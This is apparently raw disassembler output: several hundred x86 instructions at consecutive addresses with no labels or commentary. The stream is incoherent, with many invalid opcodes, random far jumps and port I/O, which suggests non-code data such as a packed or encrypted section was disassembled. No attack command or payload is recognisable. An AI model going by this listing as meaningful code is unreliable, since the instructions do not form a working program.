  41ee93:	(bad)  
  41ee94:	pop    DWORD PTR [edx+eiz*4]
  41ee97:	ror    edi,1
  41ee99:	mov    cl,0x53
  41ee9c:	ffreep st(0)
  41ee9e:	and    ebp,ebp
  41eea0:	and    al,0xe5
  41eea2:	pop    es
  41eea3:	jne    0x41eebe
  41eea5:	pop    esp
  41eea6:	repz test al,0x81
  41eea9:	ins    DWORD PTR es:[edi],dx
  41eeaa:	sub    eax,0x1235246d
  41eeaf:	retf   0x5a10
  41eeb2:	repz sub al,0xfa
  41eeb5:	inc    ecx
  41eeb6:	data16 jae 0x41ef16
  41eeb9:	pop    ebx
  41eeba:	and    bh,BYTE PTR [ebx+ecx*4]
  41eebd:	shl    BYTE PTR [ebx+esi*8],0x95
  41eec1:	popa   
  41eec2:	inc    edx
  41eec3:	push   ds
  41eec4:	xor    cl,BYTE PTR [ebx+0xadd8cdd]
  41eeca:	cmp    al,0x76
  41eecc:	int3   
  41eecd:	sti    
  41eece:	test   ah,0x76
  41eed1:	stos   BYTE PTR es:[edi],al
  41eed2:	out    0x48,eax
  41eed4:	call   0x7a5f:0x6d6f427a
  41eedb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eedc:	aad    0x81
  41eede:	pop    es
  41eedf:	mov    ds:0xaa74b765,al
  41eee4:	pop    edi
  41eee5:	add    DWORD PTR [ebx+0x6b],0xffffffed
  41eee9:	push   esp
  41eeea:	ds push ebx
  41eeec:	push   es
  41eeed:	xchg   esp,eax
  41eeee:	lahf   
  41eeef:	cli    
  41eef0:	outs   dx,DWORD PTR ds:[esi]
  41eef1:	or     DWORD PTR [esi+0x25],edx
  41eef4:	pop    ecx
  41eef5:	jb     0x41eece
  41eef7:	rcl    BYTE PTR [ebx],1
  41eef9:	sahf   
  41eefa:	sahf   
  41eefb:	out    dx,al
  41eefc:	in     eax,0x36
  41eefe:	push   ecx
  41eeff:	jle    0x41eef9
  41ef01:	xchg   dh,al
  41ef03:	aad    0xb8
  41ef05:	fld    TBYTE PTR [ebp+0x2fe758d2]
  41ef0b:	fsubr  QWORD PTR [ecx]
  41ef0d:	enter  0xeb66,0xa6
  41ef11:	pop    ecx
  41ef12:	lds    ebx,FWORD PTR ds:0x246b9132
  41ef18:	stos   DWORD PTR es:[edi],eax
  41ef19:	sub    eax,0x385d2231
  41ef1e:	fist   WORD PTR [ebx-0xe79e14b]
  41ef24:	add    DWORD PTR [ecx+edi*2-0x69152879],eax
  41ef2b:	xor    al,al
  41ef2d:	mov    esp,0x38a2779a
  41ef32:	adc    al,0x28
  41ef34:	pop    esi
  41ef35:	add    eax,0x8d1f79d5
  41ef3a:	xchg   edi,eax
  41ef3b:	ss jnp 0x41ef0b
  41ef3e:	aaa    
  41ef3f:	xor    edx,ebx
  41ef41:	idiv   BYTE PTR [esi+0xf]
  41ef44:	lock jge 0x41ef92
  41ef47:	idiv   DWORD PTR [esi-0x23a870b5]
  41ef4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef4e:	mov    dh,0x64
  41ef50:	add    DWORD PTR [ecx],edi
  41ef52:	ins    BYTE PTR es:[edi],dx
  41ef53:	inc    edi
  41ef54:	mov    ds:0xb16574bc,al
  41ef59:	cmp    eax,0x36345f8d
  41ef5e:	pop    es
  41ef5f:	sbb    dh,cl
  41ef61:	outs   dx,BYTE PTR ds:[esi]
  41ef62:	pop    edi
  41ef63:	xor    DWORD PTR [eax+0x0],ebp
  41ef66:	mov    ds:0x2eb10c52,al
  41ef6b:	les    ebp,FWORD PTR [eax]
  41ef6d:	mov    ds:0x1add0952,al
  41ef72:	or     ah,al
  41ef74:	pop    eax
  41ef75:	std    
  41ef76:	or     al,BYTE PTR [edi]
  41ef78:	jl     0x41ef54
  41ef7a:	ret    0x82da
  41ef7d:	push   eax
  41ef7e:	lods   eax,DWORD PTR ds:[esi]
  41ef7f:	inc    eax
  41ef80:	cmp    al,0xc2
  41ef83:	call   0x44ba953
  41ef88:	icebp  
  41ef89:	sar    BYTE PTR [edx+0x193bfa1d],0x6a
  41ef90:	pop    ecx
  41ef91:	adc    edx,DWORD PTR [esp+ebx*2-0x222a8305]
  41ef98:	xchg   edx,eax
  41ef99:	icebp  
  41ef9a:	hlt    
  41ef9b:	sbb    bh,BYTE PTR [ecx-0x7e]
  41ef9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef9f:	lea    ebx,[edi+0x5a]
  41efa2:	xchg   ebx,eax
  41efa3:	test   eax,0x86f60bcf
  41efa8:	xor    edx,0xe5b381f
  41efae:	dec    ebx
  41efaf:	add    esp,ebx
  41efb1:	ins    DWORD PTR es:[edi],dx
  41efb2:	daa    
  41efb3:	test   BYTE PTR [ebp+0x21],dl
  41efb6:	cli    
  41efb7:	nop
  41efb8:	xchg   ebp,eax
  41efb9:	dec    eax
  41efba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efbb:	je     0x41efbc
  41efbd:	les    esi,FWORD PTR [ecx+0x14]
  41efc0:	mov    esi,0x58d74d38
  41efc5:	ins    BYTE PTR es:[edi],dx
  41efc6:	pop    ecx
  41efc7:	call   0xd78e:0x5e2a04ff
  41efce:	xchg   ebx,eax
  41efcf:	mov    dl,0x62
  41efd1:	ins    DWORD PTR es:[edi],dx
  41efd2:	jg     0x41f046
  41efd4:	add    esp,DWORD PTR [edx]
  41efd6:	or     DWORD PTR [edx+0x387f749c],ebx
  41efdc:	dec    esi
  41efdd:	mov    eax,ds:0x6041a1bc
  41efe2:	sbb    ebp,0x62
  41efe5:	aaa    
  41efe6:	pop    ss
  41efe7:	dec    esp
  41efe8:	daa    
  41efe9:	fnsave [edi-0x7fdd25b8]
  41efef:	lods   eax,DWORD PTR ds:[esi]
  41eff0:	loope  0x41f057
  41eff2:	outs   dx,BYTE PTR ds:[esi]
  41eff3:	jnp    0x41f06d
  41eff5:	mov    bh,0xab
  41eff7:	int    0x9e
  41eff9:	xchg   edx,eax
  41effa:	popf   
  41effb:	adc    edx,eax
  41effd:	popa   
  41effe:	adc    al,dh
  41f000:	add    DWORD PTR [ebp-0x43199bb9],edx
  41f006:	mov    esp,0xdd6b944d
  41f00b:	std    
  41f00c:	mov    al,ds:0x430a180d
  41f011:	les    ebx,FWORD PTR [eax-0x1d]
  41f014:	jle    0x41efac
  41f016:	ss clc 
  41f018:	neg    ebp
  41f01a:	int    0xad
  41f01c:	dec    ebp
  41f01d:	mov    ?,WORD PTR ds:0x2be3315c
  41f023:	push   es
  41f024:	das    
  41f025:	rol    BYTE PTR [ecx],cl
  41f027:	daa    
  41f028:	aam    0x5
  41f02a:	rcr    eax,1
  41f02c:	stc    
  41f02d:	mov    ds:0x8e7803db,eax
  41f032:	add    ebp,DWORD PTR [ebp+0x1a457046]
  41f038:	cmp    eax,0xbea11635
  41f03d:	cdq    
  41f03e:	or     DWORD PTR [esi],esp
  41f040:	lea    ebx,[ecx]
  41f042:	sar    BYTE PTR [ecx],0x88
  41f045:	cmp    eax,0x9687a3c
  41f04a:	jns    0x41efcd
  41f04c:	push   es
  41f04d:	add    esi,0x418e6f1e
  41f053:	jb     0x41f05b
  41f055:	add    ch,cl
  41f057:	mov    cl,0x83
  41f059:	nop
  41f05a:	xor    ebp,edi
  41f05c:	adc    DWORD PTR [ebp-0x29abfe1a],edi
  41f062:	xchg   edi,eax
  41f063:	dec    esp
  41f064:	xchg   esp,eax
  41f065:	bswap  esp
  41f067:	loopne 0x41f04e
  41f069:	retf   
  41f06a:	mov    ch,BYTE PTR [edx+0x5dd6ebca]
  41f070:	fdivr  QWORD PTR [esp+ebp*2+0x3e]
  41f074:	call   0x8d56:0x33ad2e74
  41f07b:	jb     0x41f0a4
  41f07d:	leave  
  41f07e:	adc    ch,BYTE PTR [edi-0x9]
  41f081:	push   ebp
  41f082:	jb     0x41f021
  41f084:	xchg   edx,eax
  41f085:	jge    0x41f0e8
  41f087:	adc    al,0xa8
  41f089:	aaa    
  41f08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f08b:	pop    edi
  41f08c:	je     0x41f0fb
  41f08e:	in     al,0x22
  41f090:	aam    0x44
  41f092:	xlat   BYTE PTR ds:[ebx]
  41f093:	cdq    
  41f094:	jge    0x41f0c7
  41f096:	ret    
  41f097:	ret    0xd367
  41f09a:	shl    dl,1
  41f09c:	scas   eax,DWORD PTR es:[edi]
  41f09d:	lock push ebx
  41f09f:	ror    BYTE PTR [esi+0x105ef971],1
  41f0a5:	in     eax,dx
  41f0a6:	mov    esp,0x15487542
  41f0ab:	xchg   ebx,ebp
  41f0ad:	adc    bl,ah
  41f0af:	mov    eax,ds:0x186463a1
  41f0b4:	jmp    0x41f037
  41f0b6:	in     eax,dx
  41f0b7:	or     eax,0x39726b63
  41f0bc:	out    dx,eax
  41f0bd:	mov    dl,0x31
  41f0bf:	das    
  41f0c0:	int3   
  41f0c1:	cmp    ecx,DWORD PTR [eax]
  41f0c3:	ds sbb bl,BYTE PTR gs:0xf1b83fab
  41f0cb:	inc    eax
  41f0cc:	jl     0x41f0aa
  41f0ce:	data16 sbb bl,BYTE PTR [edx+edx*8-0x79a43e19]
  41f0d6:	push   0xa31e2836
  41f0db:	jle    0x41f12a
  41f0dd:	cwde   
  41f0de:	jmp    0xece0:0x6ccbf063
  41f0e5:	add    eax,0x98479f3f
  41f0ea:	ins    BYTE PTR es:[edi],dx
  41f0eb:	call   0x80d2:0x54298c0e
  41f0f2:	mov    ebx,0xf6e8792b
  41f0f7:	rcr    BYTE PTR ds:0x451ff75f,cl
  41f0fd:	fisttp DWORD PTR [eax-0x5e]
  41f100:	dec    eax
  41f101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f102:	sub    BYTE PTR [eax],al
  41f104:	push   ecx
  41f105:	shl    edx,0x3e
  41f108:	test   DWORD PTR [ebx+0x632f5f7c],ecx
  41f10e:	mov    edi,DWORD PTR [ecx]
  41f110:	pop    ss
  41f111:	aaa    
  41f112:	imul   ebp,DWORD PTR [ebp-0x1e7f6b58],0x0
  41f119:	aam    0x53
  41f11b:	dec    ebx
  41f11c:	sbb    BYTE PTR [eax],cl
  41f11e:	mov    dh,0x9a
  41f120:	(bad)  
  41f121:	fcomp  DWORD PTR [ebx+0x458e47c5]
  41f127:	sbb    BYTE PTR [edi],bh
  41f129:	xor    eax,DWORD PTR [esi-0x6b]
  41f12c:	dec    edi
  41f12d:	cmc    
  41f12e:	mov    cl,0xfb
  41f130:	mov    al,0x19
  41f132:	sub    edi,esp
  41f134:	lods   al,BYTE PTR ds:[esi]
  41f135:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f137:	in     eax,dx
  41f138:	inc    edi
  41f139:	std    
  41f13a:	or     eax,0xa78f12ed
  41f13f:	rol    DWORD PTR [esi],1
  41f141:	jmp    0xfd417009
  41f146:	xchg   ebx,eax
  41f147:	hlt    
  41f148:	es scas al,BYTE PTR es:[edi]
  41f14a:	sti    
  41f14b:	enter  0x5d94,0xe0
  41f14f:	push   esp
  41f150:	push   ss
  41f151:	shl    DWORD PTR [edx-0x6e9a262d],1
  41f157:	mov    ebx,0xd56eaf06
  41f15c:	scas   eax,DWORD PTR es:[edi]
  41f15d:	pop    ds
  41f15e:	dec    edi
  41f15f:	(bad)  
  41f162:	ins    DWORD PTR es:[edi],dx
  41f163:	nop
  41f164:	jns    0x41f1e0
  41f166:	xor    al,0x49
  41f168:	sbb    bl,BYTE PTR [edi-0xb]
  41f16b:	jo     0x41f1c7
  41f16d:	push   edi
  41f16e:	std    
  41f16f:	cmp    edx,DWORD PTR [ebx+0x7d]
  41f172:	jecxz  0x41f1f3
  41f174:	or     al,0xba
  41f176:	cli    
  41f177:	lahf   
  41f178:	xlat   BYTE PTR ds:[ebx]
  41f179:	lds    ebx,FWORD PTR [edi+0x4aef7c85]
  41f17f:	fldcw  WORD PTR [edx+0x630ce159]
  41f185:	and    eax,0x537874f9
  41f18a:	outs   dx,BYTE PTR ds:[esi]
  41f18b:	mov    ecx,0xf984c438
  41f190:	test   al,0x63
  41f192:	lahf   
  41f193:	jbe    0x41f1f4
  41f195:	mov    esp,0x8093118b
  41f19a:	popa   
  41f19b:	xor    bl,BYTE PTR [edx-0x7a]
  41f19e:	int3   
  41f19f:	ins    DWORD PTR es:[edi],dx
  41f1a0:	adc    eax,0x246f0e71
  41f1a5:	nop
  41f1a6:	test   al,0x19
  41f1a8:	cmp    ebp,DWORD PTR [eax-0x1bec6d6f]
  41f1ae:	add    DWORD PTR [eax+0x5d],edx
  41f1b1:	sub    eax,0x76cc509d
  41f1b6:	lds    ebp,FWORD PTR [ecx-0x658d736b]
  41f1bc:	sbb    ah,dh
  41f1be:	mov    esi,edx
  41f1c0:	jl     0x41f1b3
  41f1c2:	cmp    BYTE PTR [esi-0x5],dl
  41f1c5:	inc    edi
  41f1c6:	loop   0x41f157
  41f1c8:	adc    DWORD PTR [ebx],edi
  41f1ca:	push   0xffffffe3
  41f1cc:	fnstsw WORD PTR [edi+0x1bf1f16a]
  41f1d2:	or     BYTE PTR [edi-0x46970ff3],ah
  41f1d8:	retf   
  41f1d9:	or     al,0x79
  41f1db:	frstor ds:0xc5d7bc69
  41f1e1:	popa   
  41f1e2:	mov    al,0x9c
  41f1e4:	test   BYTE PTR [edx],ah
  41f1e6:	aaa    
  41f1e7:	mov    BYTE PTR [edi+0x1],cl
  41f1ea:	(bad)  
  41f1eb:	mov    edx,0x162c8338
  41f1f0:	push   edi
  41f1f1:	test   BYTE PTR [esi-0x34],dh
  41f1f4:	(bad)  
  41f1f5:	sahf   
  41f1f6:	mov    ecx,0xa8c05a3c
  41f1fb:	add    esi,DWORD PTR [edx+0x4e048b62]
  41f201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f202:	mov    ds:0x2c9f677f,al
  41f207:	mov    esp,0x6bafdfab
  41f20c:	mov    ebp,0x57ffbebd
  41f211:	sbb    bl,BYTE PTR [ebx-0x7d3efeb]
  41f217:	pop    edx
  41f218:	sbb    edi,eax
  41f21a:	inc    eax
  41f21b:	xor    BYTE PTR [edi+0x321433e2],al
  41f221:	(bad)
  41f224:	mov    ch,0x40
  41f226:	aaa    
  41f227:	ror    ebp,1
  41f229:	cmp    eax,0x4699de17
  41f22e:	xor    DWORD PTR [esi+0x1f651957],ecx
  41f234:	adc    eax,0xf215abe3
  41f239:	mov    cl,BYTE PTR [ebp+0x0]
  41f23c:	fld    QWORD PTR [eax]
  41f23e:	stos   BYTE PTR es:[edi],al
  41f23f:	push   cs
  41f240:	jmp    0x116a:0xd19e8008
  41f247:	cs scas al,BYTE PTR es:[edi]
  41f249:	adc    eax,0xe5fca056
  41f24e:	daa    
  41f24f:	sub    eax,0xbb89b781
  41f254:	fsubr  st,st(5)
  41f256:	in     eax,dx
  41f257:	inc    esp
  41f258:	sbb    edx,edi
  41f25a:	pop    ecx
  41f25b:	sbb    DWORD PTR [esi],edi
  41f25d:	push   ss
  41f25e:	pop    esi
  41f25f:	dec    edx
  41f260:	inc    esp
  41f261:	sub    edi,eax
  41f263:	(bad)  
  41f264:	idiv   BYTE PTR [edx-0x25]
  41f267:	test   DWORD PTR [ebp+0x2cc79dec],ebp
  41f26d:	pusha  
  41f26e:	shl    edi,1
  41f270:	pop    ss
  41f271:	sbb    al,BYTE PTR [eax-0x5f8db0df]
  41f277:	rol    bl,1
  41f279:	nop
  41f27a:	scas   al,BYTE PTR es:[edi]
  41f27b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f27c:	jne    0x41f2c7
  41f27e:	and    al,0x15
  41f280:	lock mov edi,0xc03b3584
  41f286:	mov    bl,0x5a
  41f288:	xor    eax,0xc9f405e6
  41f28d:	sub    eax,esi
  41f28f:	sbb    eax,0xc4cafa72
  41f294:	(bad)  
  41f295:	mov    al,0x75
  41f297:	xchg   edi,eax
  41f298:	call   0x390267a1
  41f29d:	and    eax,0xc6391d42
  41f2a2:	sbb    edx,DWORD PTR [eax]
  41f2a4:	lods   eax,DWORD PTR ds:[esi]
  41f2a5:	cli    
  41f2a6:	sub    eax,DWORD PTR [ebx-0xee0259c]
  41f2ac:	xchg   DWORD PTR [esi+0x1e],eax
  41f2af:	fstp   DWORD PTR [ebx+0x15]
  41f2b2:	cmp    cl,bh
  41f2b4:	jmp    0x41f300
  41f2b6:	mov    al,BYTE PTR [edx]
  41f2b8:	test   BYTE PTR [edi+0x41],bl
  41f2bb:	jl     0x41f326
  41f2bd:	iret   
  41f2be:	mov    ebx,0xf40b0798
  41f2c3:	mov    al,ds:0xad3de1f9
  41f2c8:	jecxz  0x41f259
  41f2ca:	fwait
  41f2cb:	adc    al,0xa8
  41f2cd:	pop    esp
  41f2ce:	(bad)  
  41f2cf:	dec    ebp
  41f2d0:	mov    al,0x23
  41f2d2:	mov    ebx,0x29095011
  41f2d7:	xchg   ebp,eax
  41f2d8:	add    dl,bh
  41f2da:	leave  
  41f2db:	push   ecx
  41f2dc:	or     al,0x9f
  41f2de:	jae    0x41f2c5
  41f2e0:	stc    
  41f2e1:	cmp    ecx,DWORD PTR [edi]
  41f2e3:	xor    DWORD PTR [edx+0x52],0xaa698c48
  41f2ea:	xor    ah,dh
  41f2ec:	daa    
  41f2ed:	(bad)  
  41f2ee:	push   ecx
  41f2ef:	xlat   BYTE PTR gs:[ebx]
  41f2f1:	and    BYTE PTR [eax],dh
  41f2f3:	sbb    ebx,0xffffff98
  41f2f6:	lea    esp,[ebp-0x47a4351c]
  41f2fc:	stos   DWORD PTR es:[edi],eax
  41f2fd:	xor    eax,0xbe3a07d
  41f302:	push   ebx
  41f303:	daa    
  41f304:	push   0xfffffff8
  41f306:	mov    ds,WORD PTR [edx+0x2a7d6ef0]
  41f30c:	mov    eax,ds:0xf0f73810
  41f311:	jmp    0x51a59648
  41f316:	pushf  
  41f317:	or     esp,DWORD PTR [ebx-0x62]
  41f31a:	mov    ecx,0xf5b8c8ca
  41f31f:	inc    eax
  41f320:	jle    0x41f2f0
  41f322:	iret   
  41f323:	out    dx,eax
  41f324:	popa   
  41f325:	repnz adc edx,ebp
  41f328:	out    dx,eax
  41f329:	or     bl,BYTE PTR [ebx]
  41f32b:	and    BYTE PTR [ebp-0x6f],0xe3
  41f32f:	leave  
  41f330:	out    0x39,al
  41f332:	addr16 and ecx,edx
  41f335:	sub    eax,DWORD PTR [ebx+ebp*8+0x148d6e9c]
  41f33c:	xchg   esp,eax
  41f33d:	or     BYTE PTR [esi-0x55f2b061],ch
  41f343:	sar    BYTE PTR [ebp+0x17],cl
  41f346:	or     DWORD PTR [eax-0x79da2b0b],ecx
  41f34c:	cmp    eax,0xa60c289e
  41f351:	pop    edi
  41f352:	jmp    0x2037:0xa9be1036
  41f359:	bound  eax,QWORD PTR [edi-0x30d5bb07]
  41f35f:	pusha  
  41f360:	mov    BYTE PTR [edi+0x50fc2664],0xd2
  41f367:	pusha  
  41f368:	mov    DWORD PTR [esi+eiz*1+0x62748153],edx
  41f36f:	mov    dh,0x89
  41f371:	jmp    0xfc71:0xbf6e5b4e
  41f378:	dec    edx
  41f379:	mov    eax,ds:0xc5ab07f
  41f37e:	shl    DWORD PTR [ebx+0x7712b905],cl
  41f384:	sbb    al,0x4e
  41f386:	mov    al,0x9f
  41f388:	fisubr DWORD PTR ds:0x93a65881
  41f38e:	jl     0x41f3f9
  41f390:	inc    ebp
  41f391:	into   
  41f392:	mov    cl,0xfb
  41f394:	cwde   
  41f395:	dec    ebp
  41f396:	sub    eax,esi
  41f398:	sub    BYTE PTR [eax+ebp*1+0x5ee72528],ah
  41f39f:	(bad)  
  41f3a1:	sbb    BYTE PTR [edx+eax*2-0x6338d747],bh
  41f3a8:	add    al,0xa3
  41f3aa:	test   BYTE PTR [ebx+0x41],0xe2
  41f3ae:	sub    esp,esp
  41f3b0:	outs   dx,BYTE PTR ds:[esi]
  41f3b1:	arpl   WORD PTR [esi-0x3d],bx
  41f3b4:	jbe    0x41f342
  41f3b6:	mov    dl,0xf
  41f3b8:	lahf   
  41f3b9:	into   
  41f3ba:	fdivr  QWORD PTR [esi+0xc]
  41f3bd:	sub    al,dl
  41f3bf:	pop    edx
  41f3c0:	xchg   ebp,eax
  41f3c1:	cmp    esi,ecx
  41f3c3:	xor    ah,ah
  41f3c5:	jno    0x41f435
  41f3c7:	and    al,0x43
  41f3c9:	inc    ebp
  41f3ca:	push   ss
  41f3cb:	int    0x99
  41f3cd:	sbb    al,0xe5
  41f3cf:	cmp    al,0x32
  41f3d1:	pop    ecx
  41f3d2:	jl     0x41f357
  41f3d4:	lahf   
  41f3d5:	cmp    dl,ch
  41f3d7:	push   cs
  41f3d8:	xchg   esp,eax
  41f3d9:	lock jb 0x41f42c
  41f3dc:	sbb    eax,eax
  41f3de:	mul    DWORD PTR [eax+ebx*4]
  41f3e1:	bound  esi,QWORD PTR [edi+0x56]
  41f3e4:	fst    DWORD PTR [ecx+0x7b]
  41f3e7:	fnstenv [ebp-0x664b07e3]
  41f3ed:	push   0x87b21f75
  41f3f2:	lahf   
  41f3f3:	stos   DWORD PTR es:[edi],eax
  41f3f4:	std    
  41f3f5:	xchg   edi,eax
  41f3f6:	and    eax,0x52707c21
  41f3fb:	fadd   DWORD PTR [ebx+0x29]
  41f3fe:	cli    
  41f3ff:	popf   
  41f400:	jae    0x41f3c8
  41f402:	in     eax,dx
  41f403:	lods   al,BYTE PTR ds:[esi]
  41f404:	xchg   ebx,eax
  41f405:	and    DWORD PTR [ebp+0x48],eax
  41f408:	jmp    0x5aa142fb
  41f40d:	jae    0x41f3d4
  41f40f:	and    ebp,DWORD PTR [esi]
  41f411:	adc    DWORD PTR [ecx-0x230e28db],0x504531c7
  41f41b:	lahf   
  41f41c:	out    0x12,al
  41f41e:	jne    0x41f473
  41f420:	sahf   
  41f421:	and    al,BYTE PTR [edi]
  41f423:	pushf  
  41f424:	lods   eax,DWORD PTR ds:[esi]
  41f425:	mov    bh,0x21
  41f427:	dec    ebx
  41f428:	call   DWORD PTR [edx+0x7f20a26e]
  41f42e:	push   ds
  41f42f:	in     al,dx
  41f430:	mov    ecx,0x49047244
  41f435:	cmp    ebx,edx
  41f437:	popf   
  41f438:	dec    ebx
  41f439:	jge    0x41f3c3
  41f43b:	fist   DWORD PTR [esi+0x12e5a097]
  41f441:	pop    es
  41f442:	or     ebp,DWORD PTR [edi+eax*1]
  41f445:	pop    edi
  41f446:	push   edx
  41f447:	xor    edx,DWORD PTR [ecx]
  41f449:	push   esi
  41f44a:	mov    esp,0xaca102bb
  41f44f:	dec    edi
  41f450:	mov    bh,0x84
  41f452:	mov    ah,0xf
  41f454:	ja     0x41f413
  41f456:	mov    dh,BYTE PTR [edi+0x64]
  41f459:	dec    eax
  41f45a:	mov    eax,ds:0x7a694d53
  41f45f:	xlat   BYTE PTR ds:[ebx]
  41f460:	pop    es
  41f461:	retf   
  41f462:	rol    DWORD PTR [edx+0x68e87a13],1
  41f468:	push   ss
  41f469:	dec    esp
  41f46a:	xchg   esp,eax
  41f46b:	mov    ebp,0x6d7c9fb3
  41f470:	sub    eax,DWORD PTR [edi]
  41f472:	arpl   WORD PTR [ebp+eax*4+0x321424e4],bp
  41f479:	mov    bh,0x69
  41f47b:	addr16 mov esp,edx
  41f47e:	cmp    BYTE PTR ds:0x1edb72c1,dh
  41f484:	jecxz  0x41f41c
  41f486:	dec    ecx
  41f487:	fstp   TBYTE PTR [ebx-0x11]
  41f48a:	mov    bh,BYTE PTR [esi-0x69]
  41f48d:	fld    TBYTE PTR [edx+0x6f2ecb6f]
  41f493:	mov    edi,0x90a188da
  41f498:	jge    0x41f44d
  41f49a:	cmc    
  41f49b:	cmp    dh,ch
  41f49d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f49e:	repnz adc BYTE PTR [eax],0xb7
  41f4a2:	aaa    
  41f4a3:	rol    BYTE PTR [ecx],1
  41f4a5:	mov    BYTE PTR [ecx+ebp*1+0x3],ah
  41f4a9:	xchg   ecx,eax
  41f4aa:	scas   eax,DWORD PTR es:[edi]
  41f4ab:	or     eax,0x4afadd35
  41f4b0:	jge    0x41f4ff
  41f4b2:	pop    esi
  41f4b3:	dec    esi
  41f4b4:	shl    DWORD PTR [esi-0x325ffd6],0x44
  41f4bb:	nop
  41f4bc:	loopne 0x41f456
  41f4be:	sub    DWORD PTR [esi+0x44c44e10],eax
  41f4c4:	pusha  
  41f4c5:	(bad)  
  41f4c6:	push   0xffffffd8
  41f4c8:	shl    BYTE PTR [ebx+0x1d88eaf8],cl
  41f4ce:	add    esp,ebx
  41f4d0:	fwait
  41f4d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4d2:	inc    esi
  41f4d3:	call   0x5e60:0x6775f8e4
  41f4da:	fsub   st(3),st
  41f4dc:	into   
  41f4dd:	mov    esp,0x317c9acc
  41f4e2:	outs   dx,DWORD PTR ds:[esi]
  41f4e3:	mov    esi,0x525b8bde
  41f4e8:	and    bh,ah
  41f4ea:	add    BYTE PTR [ecx+0x1f0ab43b],bl
  41f4f0:	(bad)  
  41f4f1:	or     eax,0x8cf74c2d
  41f4f6:	inc    eax
  41f4f7:	repnz cmp bl,BYTE PTR [ebx-0x275a848a]
  41f4fe:	push   esp
  41f4ff:	jle    0x41f4ae
  41f501:	or     DWORD PTR [edx-0x56],esi
  41f504:	sbb    esi,DWORD PTR [edx]
  41f506:	call   FWORD PTR [esi]
  41f508:	popa   
  41f509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f50a:	mov    ch,0x7
  41f50c:	mov    edi,0x52cbd03
  41f511:	add    al,0x8d
  41f513:	inc    ecx
  41f514:	(bad)  
  41f516:	inc    esp
  41f517:	cwde   
  41f518:	imul   esi,DWORD PTR [edx+0x7882409c],0x5c5577c1
  41f522:	push   edx
  41f523:	mov    dh,0x7c
  41f525:	push   eax
  41f526:	sti    
  41f527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f528:	loop   0x41f4c4
  41f52a:	les    ebx,FWORD PTR [esi]
  41f52c:	mov    bh,BYTE PTR [esi+0x64]
  41f52f:	dec    ebp
  41f530:	adc    edi,DWORD PTR [esi+0x59]
  41f533:	sub    ebp,esi
  41f535:	xlat   BYTE PTR ds:[ebx]
  41f536:	push   esp
  41f537:	ja     0x41f5a9
  41f539:	add    al,BYTE PTR [edi-0x41]
  41f53c:	and    bl,dh
  41f53e:	xchg   esi,eax
  41f53f:	out    dx,eax
  41f540:	mov    al,0xfa
  41f542:	sti    
  41f543:	pop    ds
  41f544:	mov    al,ds:0xbc2367a7
  41f549:	and    ebp,DWORD PTR [ecx]
  41f54b:	jb     0x41f5a6
  41f54d:	stos   BYTE PTR es:[edi],al
  41f54e:	sub    eax,0x88d1b2f2
  41f553:	push   0xaabd160e
  41f558:	ins    DWORD PTR es:[edi],dx
  41f559:	ror    BYTE PTR [eax],cl
  41f55b:	jmp    0xd5d792b0
  41f560:	iret   
  41f561:	xlat   BYTE PTR ds:[ebx]
  41f562:	mov    gs,ecx
  41f564:	enter  0x8ff3,0xf3
  41f568:	add    cl,ah
  41f56a:	pop    eax
  41f56b:	test   eax,0x14938bc9
  41f570:	repnz call 0x303e:0x488585af
  41f578:	cmp    DWORD PTR [ecx],edi
  41f57a:	dec    esi
  41f57b:	sbb    DWORD PTR [esi+ecx*2],ebp
  41f57e:	add    dh,BYTE PTR [ecx+0x6e262713]
  41f584:	dec    edx
  41f585:	inc    ebx
  41f586:	fist   DWORD PTR [edi]
  41f588:	sbb    esp,esp
  41f58a:	adc    al,0xd2
  41f58c:	jne    0x41f57f
  41f58e:	hlt    
  41f58f:	pop    esi
  41f590:	inc    edx
  41f591:	xor    edi,DWORD PTR [eax+0x25ccb8f9]
  41f597:	test   eax,0xfa0794b3
  41f59c:	es inc ebx
  41f59e:	shr    DWORD PTR [ebp-0x16b97f9c],1
  41f5a4:	push   ds
  41f5a5:	int3   
  41f5a6:	lock jbe 0x41f5ba
  41f5a9:	xor    BYTE PTR fs:[eax+0x5f],dh
  41f5ad:	mov    cl,0x87
  41f5af:	mov    ebp,0x7cbe161d
  41f5b4:	int3   
  41f5b5:	call   0xcad57c11
  41f5ba:	sbb    al,0xac
  41f5bc:	enter  0xbc6f,0x69
  41f5c0:	shr    BYTE PTR [edi+ecx*4+0x5628914b],1
  41f5c7:	dec    ecx
  41f5c8:	jp     0x41f56a
  41f5ca:	ss push 0xd5fe6708
  41f5d0:	cmp    al,0xd
  41f5d2:	adc    edi,DWORD PTR [eax-0x77]
  41f5d5:	mov    esi,0x4e71410b
  41f5da:	cdq    
  41f5db:	cli    
  41f5dc:	scas   al,BYTE PTR es:[edi]
  41f5dd:	(bad)  
  41f5de:	and    eax,0xe56fc063
  41f5e3:	outs   dx,BYTE PTR ds:[esi]
  41f5e4:	sub    eax,0x59fd2901
  41f5e9:	ins    BYTE PTR es:[edi],dx
  41f5ea:	fst    QWORD PTR [ebx-0x3dc13960]
  41f5f0:	into   
  41f5f1:	jp     0x41f60b
  41f5f3:	popf   
  41f5f4:	cdq    
  41f5f5:	outs   dx,BYTE PTR ds:[esi]
  41f5f6:	jno    0x41f5c9
  41f5f8:	push   0x48243eb5
  41f5fd:	mov    ds:0xdd8b85ae,eax
  41f602:	or     edi,DWORD PTR [ebp+0x4b543c00]
  41f608:	cli    
  41f609:	inc    eax
  41f60a:	cwde   
  41f60b:	mov    ds:0xdfe70deb,eax
  41f610:	jmp    0xdb330564
  41f615:	xchg   edx,eax
  41f616:	inc    esp
  41f617:	es inc eax
  41f619:	add    esi,DWORD PTR [ebp+edi*2-0x12de7551]
  41f620:	fidivr WORD PTR [ebx]
  41f622:	push   edi
